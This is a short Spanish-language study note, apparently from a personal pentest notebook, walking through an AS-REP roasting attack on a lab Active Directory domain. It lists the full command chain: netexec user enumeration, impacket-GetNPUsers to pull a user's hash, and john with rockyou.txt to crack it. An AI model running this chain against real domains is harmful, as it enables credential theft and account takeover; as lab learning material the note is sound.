
este ataque es para tratar de obtener credenciales de los usuarios dentro de un dominio 
```python
netexec smb 192.168.159.0/24 --users -u 'deportado' -p 'Password1' 
```

 lo primero que tenemos que hacer es listar los usuarios dentro del dominio  ![[Pasted image 20260608224632.png]]
   cuando logramos ver los usuarios necesitamos hacer un tratamiento de datos para sacar los usuarios en limpio con el siguiente comando 
   ```python
    netexec smb 192.168.159.0/24 --users -u 'deportado' -p 'Password1'| awk '{print $5}'
   ```
![[Pasted image 20260608224949.png]]
  cuando ya tenemos los usuarios listados lo que hacemos esque creamos un archivo con ***nano***  y luego ejecutamos el siguiente comando 
```python
impacket-GetNPUsers -no-pass -usersfile usuarios.txt camilo.corp/ 
```
![[Pasted image 20260608225905.png]]
lo que busca entre todos los usuarios si podemos accedes a un hash como se evidencia en este caso que obtuvimos el hash de ***juan***  seguidamente hacemos otro archivo con ***nano*** y dentro ponemos el hash que obtuvimos seguidamente lo crackeamos con las herramienta [[john the ripper]]

```python
john --wordlist=rockyou.txt hs1.txt
```
![[Pasted image 20260608230353.png]]
 y de esta manera obtenemos la contraseña de juan 


con este ataque no siempre se necesita credenciales porque se hace con la intención de encontrar algún null Session para poder explotarlo 